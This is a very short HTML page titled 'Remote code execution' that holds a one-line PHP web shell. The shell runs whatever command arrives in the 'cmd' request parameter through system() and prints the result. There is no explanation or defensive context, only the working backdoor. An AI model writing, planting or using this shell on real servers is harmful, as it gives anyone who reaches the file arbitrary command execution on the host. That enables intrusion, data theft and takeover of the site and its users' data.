<html>
<body>
<b>Remote code execution:</b><br>
<pre>
    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
</pre>
</body>
</html>
